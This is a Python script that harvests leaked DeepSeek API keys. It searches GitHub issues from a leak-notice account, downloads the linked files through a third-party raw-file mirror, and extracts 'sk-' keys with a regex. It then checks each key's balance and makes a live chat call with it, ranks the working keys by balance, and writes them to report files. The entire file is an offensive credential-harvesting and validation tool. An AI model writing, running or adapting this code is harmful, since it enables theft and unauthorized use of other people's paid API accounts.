import re
import json
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

API_TOKEN = ""  # Option 1: Set via environment variable: export GITHUB_TOKEN="your_token"
              # Option 2: Directly replace this empty string with your token: API_TOKEN = "ghp_xxx"

DEEPSEEK_BALANCE_URL = "https://api.deepseek.com/user/balance"
DEEPSEEK_CHAT_URL = "https://api.deepseek.com/v1/chat/completions"
GITHUB_SEARCH_QUERY = "your key leak author:chinese-leak-key-check"
MAX_PAGES = 10
PER_PAGE = 100

HEADERS = {'Accept': 'application/json'}
if API_TOKEN:
    HEADERS['Authorization'] = f"Bearer {API_TOKEN}"


def fetch_all_issues():
    all_items = []
    for page in range(1, MAX_PAGES + 1):
        url = f"https://api.github.com/search/issues?q={GITHUB_SEARCH_QUERY}&sort=created&order=desc&per_page={PER_PAGE}&page={page}"
        try:
            response = requests.get(url, headers=HEADERS, timeout=15)
            if response.status_code != 200:
                print(f"[-] Page {page} failed with HTTP {response.status_code}")
                break
            data = response.json()
            items = data.get("items", [])
            if not items:
                break
            all_items.extend(items)
            print(f"[*] Page {page}/{MAX_PAGES}: fetched {len(items)} items (total: {len(all_items)})")
            if len(items) < PER_PAGE:
                break
        except requests.RequestException as e:
            print(f"[-] Page {page} request failed: {e}")
            break
    return all_items


def fetch_keys_from_issue(issue_item):
    keys = set()
    try:
        issue_url = issue_item.get("url")
        if not issue_url:
            return keys

        issue_body = requests.get(issue_url, headers=HEADERS, timeout=10).json().get("body", "")

        url_match = re.search(r"https?://github\.com\S+", issue_body)
        if not url_match:
            return keys

        raw_file_url = url_match.group().replace("github.com", "raw.keccak.top").replace("/blob", "")

        file_content = requests.get(raw_file_url, timeout=10).text
        found_keys = re.findall(r'\bsk-[a-f0-9]{32}\b', file_content)

        return set(found_keys)
    except requests.RequestException:
        return keys


def check_key_full(api_key):
    result = {
        'key': api_key,
        'cny_balance': 0.0,
        'usd_balance': 0.0,
        'is_available': False,
        'api_test_success': False,
        'api_response_time': 0,
        'api_status_code': None,
        'error': None
    }

    try:
        headers = {
            'Accept': 'application/json',
            'Authorization': f"Bearer {api_key}"
        }
        balance_response = requests.get(DEEPSEEK_BALANCE_URL, headers=headers, timeout=10)
        balance_data = balance_response.json()

        if not balance_data.get("is_available"):
            result['error'] = 'Balance check: is_available=false'
            return result

        for info in balance_data.get("balance_infos", []):
            amount = float(info.get("total_balance", 0))
            currency = info.get("currency", "CNY")
            if currency == "CNY":
                result['cny_balance'] = amount
            else:
                result['usd_balance'] = amount

        if result['cny_balance'] < 0 and result['usd_balance'] < 0:
            result['error'] = 'Both CNY and USD balances are negative'
            return result

        result['is_available'] = True

        start_time = time.time()
        chat_response = requests.post(
            DEEPSEEK_CHAT_URL,
            headers=headers,
            json={
                "model": "deepseek-chat",
                "messages": [{"role": "user", "content": "hi"}],
                "max_tokens": 10
            },
            timeout=10
        )
        result['api_response_time'] = round((time.time() - start_time) * 1000, 2)
        result['api_status_code'] = chat_response.status_code

        if chat_response.status_code == 200:
            result['api_test_success'] = True
        else:
            result['error'] = f'API test failed: HTTP {chat_response.status_code}'

    except requests.RequestException as e:
        result['error'] = f'Request error: {str(e)}'
    except Exception as e:
        result['error'] = f'Unexpected error: {str(e)}'

    return result


def generate_txt_report(valid_keys, cny_total, usd_total, timestamp):
    filename = f"deepseek_keys_report_{timestamp}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("DeepSeek API Key Validation Report\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

        f.write("Summary:\n")
        f.write(f"  CNY Total: {round(cny_total, 2)}\n")
        f.write(f"  USD Total: {round(usd_total, 2)}\n")
        f.write(f"  Valid Keys: {len(valid_keys)}\n\n")

        f.write("Valid Keys (sorted by balance, descending):\n")
        f.write("-" * 60 + "\n")
        for item in valid_keys:
            f.write(f"Key: {item['key']}\n")
            f.write(f"  CNY: {item['cny_balance']} | USD: {item['usd_balance']}\n")
            f.write(f"  API Response Time: {item['api_response_time']}ms\n")
            f.write("-" * 60 + "\n")

        if valid_keys:
            for item in valid_keys:
                if item['cny_balance'] < 1 and item['usd_balance'] < 0.1:
                    f.write(f"[!] Low Balance Warning: {item['key'][:20]}...\n")

    return filename


def generate_json_report(valid_keys, all_results, cny_total, usd_total, timestamp):
    filename = f"deepseek_keys_report_{timestamp}.json"
    report = {
        "generated_at": datetime.now().isoformat(),
        "summary": {
            "cny_total": round(cny_total, 2),
            "usd_total": round(usd_total, 2),
            "valid_keys_count": len(valid_keys),
            "total_keys_tested": len(all_results)
        },
        "valid_keys": valid_keys,
        "all_results": all_results
    }

    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    return filename


def main():
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    if not API_TOKEN:
        print("[-] Warning: API_TOKEN not set. GitHub API rate limit: 60 req/hr (authenticated: 5000 req/hr).")
        print("    Set via environment: export GITHUB_TOKEN=xxx  OR  edit API_TOKEN variable directly")
    print(f"[*] Searching GitHub leaked issues (max {MAX_PAGES} pages, {PER_PAGE} items/page)...")
    search_results = fetch_all_issues()
    if not search_results:
        print("[-] No issues found.")
        return

    all_extracted_keys = set()
    print(f"[*] Extracting keys from {len(search_results)} issues in parallel...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(fetch_keys_from_issue, item): item for item in search_results}
        for future in as_completed(futures):
            all_extracted_keys.update(future.result())

    print(f"[+] Extracted and deduplicated, got {len(all_extracted_keys)} unique keys.")

    all_results = []
    valid_keys = []
    cny_total = 0.0
    usd_total = 0.0

    print(f"[*] Verifying {len(all_extracted_keys)} keys (balance + API test) in parallel with 10 threads...")
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_key_full, key): key for key in all_extracted_keys}
        for future in as_completed(futures):
            result = future.result()
            all_results.append(result)

            if result['is_available'] and result['api_test_success']:
                valid_keys.append(result)
                cny_total += result['cny_balance']
                usd_total += result['usd_balance']
                print(f"[+] Valid Key: {result['key']} | CNY: {result['cny_balance']} | USD: {result['usd_balance']} | Response: {result['api_response_time']}ms")

    elapsed = time.time() - start_time
    print(f"\n[*] Verification completed in {elapsed:.2f} seconds.")

    valid_keys.sort(key=lambda x: x['cny_balance'] + x['usd_balance'] * 7.2, reverse=True)

    print("\n" + "=" * 60)
    print("Summary:")
    print(f"  Total Keys Tested: {len(all_results)}")
    print(f"  Valid Keys: {len(valid_keys)}")
    print(f"  CNY Total: {round(cny_total, 2)}")
    print(f"  USD Total: {round(usd_total, 2)}")
    print("=" * 60)

    print("\n[*] Generating report files...")
    txt_file = generate_txt_report(valid_keys, cny_total, usd_total, timestamp)
    json_file = generate_json_report(valid_keys, all_results, cny_total, usd_total, timestamp)

    print(f"[+] Report saved: {txt_file}")
    print(f"[+] Report saved: {json_file}")


if __name__ == "__main__":
    main()
